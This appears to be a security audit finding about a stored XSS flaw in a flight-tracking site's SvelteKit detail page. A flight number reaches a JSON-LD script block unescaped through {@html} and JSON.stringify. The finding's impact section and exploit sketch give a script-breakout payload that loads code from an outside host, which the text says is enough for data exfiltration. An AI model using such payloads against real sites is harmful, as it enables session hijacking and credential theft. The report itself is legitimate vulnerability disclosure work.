---
Phase: 3
Sequence: 010
Slug: json-ld-script-injection-flight-detail
Verdict: VALID
Severity-Original: MEDIUM
Confidence: medium
Source-Drafts:
  - piolium/findings-draft/longshot-b1b2b937-002-json-ld-script-injection.md
---

## Summary

The flight detail page (`routes/flights/[id]/+page.svelte:233-237`) injects `flight.flightNumber` into a `<script type="application/ld+json">` block via Svelte's `{@html}` directive wrapped in `JSON.stringify`. `JSON.stringify` does not escape the `</script>` sequence — it only escapes `"`, `\`, and control characters. If a flight number contains `</script>` (e.g., from a compromised upstream scraper source), the HTML parser will terminate the JSON-LD script tag, and subsequent content executes as arbitrary HTML/JavaScript.

## Affected Files

- `apps/web/src/routes/flights/[id]/+page.svelte:233-237` — `{@html}` with `JSON.stringify` containing `flight.flightNumber`
- `apps/web/src/routes/flights/[id]/+page.server.ts:15-21` — flight data loaded from DB without sanitization
- `packages/database/schema.ts:47` — `flightNumber: varchar('flight_number', { length: 20 })`
- `apps/guernsey-scraper/src/scraper.ts:601-606` — scraper stores `flightNumber` from external API without validation

## Root Cause

Svelte's `{@html}` directive injects raw HTML without escaping. `JSON.stringify` is incorrectly assumed to be safe for HTML script context, but it does not escape `</script>` — the sequence that terminates HTML script tags. A `varchar(20)` flight number like `GR</script><script>...` fits within the column limit.

## Attacker Control

Indirect — requires compromising a scraper data source (Aurigny API, Guernsey Airport, or Flightradar24) to inject a malicious flight number, or exploiting a scraper validation gap. Flight numbers are stored as `varchar(20)` with no format validation.

## Impact

Stored XSS in the airways.gg origin when a user views a flight detail page with a poisoned flight number. Enables session hijacking, credential theft, and phishing. The `varchar(20)` limit constrains payloads to ~20 chars, but `<script/src=//x0.nz>` (20 chars) is sufficient for data exfiltration.

## Evidence

**`{@html}` injection** (`routes/flights/[id]/+page.svelte:233-237`):
```svelte
{@html `<script type="application/ld+json">${JSON.stringify({
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [
      { ..., "name": flight.flightNumber, ... }
    ]
  })}</script>`}
```

**`JSON.stringify` does NOT escape `</script>`**:
```javascript
JSON.stringify("</script><script>alert(1)</script>")
// Result: '"</script><script>alert(1)</script>"'
// The </script> in the string breaks out of the HTML script tag
```

**Flight number stored without validation** (`packages/database/schema.ts:47`):
```typescript
flightNumber: varchar('flight_number', { length: 20 }).notNull(),
```

## Exploit Sketch

1. Compromise a scraper data source to inject flight number `GR</script><script/src=//x0.nz>`
2. Scraper stores the poisoned flight number in the database
3. Victim navigates to `/flights/<id>` for that flight
4. HTML parser sees `</script>` and closes the JSON-LD tag
5. Injected `<script>` executes in airways.gg origin

## Confidence Notes

MEDIUM confidence — the injection point (`{@html}` + `JSON.stringify` with unescaped `</script>`) is confirmed. The attack requires upstream scraper data compromise, which is a significant prerequisite. CSP headers (not verified) could block inline scripts. The 20-char column limit constrains payloads but does not prevent exploitation (e.g., `<script/src=//x0.nz>` is 20 chars).
